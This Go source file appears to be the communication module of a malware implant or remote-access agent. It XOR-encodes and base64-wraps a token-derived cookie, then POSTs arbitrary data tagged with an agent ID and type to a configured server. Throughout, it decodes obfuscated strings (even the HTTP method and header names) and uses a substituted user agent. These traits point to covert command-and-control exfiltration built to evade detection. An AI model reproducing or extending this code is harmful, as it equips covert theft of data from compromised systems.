package api

import (
	"agent/lib"
	"agent/vars"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
)

var (
	Cookie string
	ID     string
)

func SetCookie(id string) error {
	var err error
	ID = id
	cookieb, err := lib.XOR([]byte(lib.Cfg.Token), []byte(id))
	if err != nil {
		return err
	}

	Cookie = base64.StdEncoding.EncodeToString(cookieb)
	return nil
}

func SendData(t string, d []byte) error {
	url := fmt.Sprintf(lib.Decode(vars.Req_urlfmt),
		lib.Cfg.URL, url.QueryEscape(ID), url.QueryEscape(t))
	req, err := http.NewRequest(lib.Decode(vars.Req_POST),
		url, bytes.NewReader(d))
	if err != nil {
		return err
	}

	req.Header.Add(lib.Decode(vars.Headers_usr), lib.GetAgent())
	req.Header.Add(lib.Decode(vars.Headers_type), lib.Decode(vars.Headers_json))
	req.Header.Add(lib.Decode(vars.Headers_auth), lib.Reverse([]byte(Cookie)))
	res, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	defer res.Body.Close()

	body, err := io.ReadAll(res.Body)
	if err != nil {
		return err
	}

	resdata := struct {
		Error int `json:"error"`
	}{}

	err = json.Unmarshal(body, &resdata)
	if err != nil {
		return err
	}

	if resdata.Error != 0 {
		return errors.New(lib.Decode(vars.Msg_BadAPI) + " " + fmt.Sprint(resdata.Error))
	}

	return nil
}

func SendJSON(t string, d interface{}) error {
	data, err := lib.MarshalJSON(d)
	if err != nil {
		return err
	}
	return SendData(t, data)
}
